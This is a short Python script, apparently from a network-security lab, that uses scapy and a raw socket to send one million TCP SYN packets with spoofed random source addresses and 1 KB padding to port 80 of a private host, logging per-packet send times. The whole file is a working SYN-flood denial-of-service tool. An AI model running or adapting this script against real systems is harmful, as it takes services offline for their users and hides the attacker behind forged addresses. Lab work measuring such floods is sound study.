from socket import AF_INET, SOCK_RAW,IPPROTO_RAW
from time import sleep
from socket import*
from typing import Counter
from scapy.all import *
from scapy.layers.inet import IP, TCP
from signal import signal, SIGINT
from sys import exit
# def handler(signal_received, frame):
#     # Handle any cleanup here
#     f.write(str(total_time/counter) + "\n")
#     f.close()
#     exit(0)
if __name__ == '__main__':
    try:
        s=socket.socket(AF_INET,SOCK_RAW,IPPROTO_RAW)
    except socket.error as err:
            print ("socket creation failed with error %s" %(err))
    # # tell kernel not to put in headers, since we are providing it
    # s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    target_ip = '10.0.2.4'
    target_port = 80
    # s.connect((target_ip, target_port))
   
    total_time = 0
    ip = IP(src=RandIP(),dst=target_ip)
    f = open("syns_results_p.txt","w")
    counter = 0
    
    for i in range (0,100):
        for j in range (0,10000):

            tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
            raw = Raw(b"X"*1024)
            p = ip / tcp / raw
            initiail_time = time.time() #Store the time when request is sent
            s.sendto(bytes(p),(target_ip,target_port))
            ending_time = time.time() #Time when acknowledged the request
            elapsed_time = str((ending_time - initiail_time)*1000)
            total_time += (ending_time - initiail_time)
            f.write(str(counter) + "," + elapsed_time +"\n")
            counter+=1
            print(counter)
    f.write(str(total_time))
    f.write(str(total_time/counter) + "\n")
    f.close()
    exit(0)
    
    




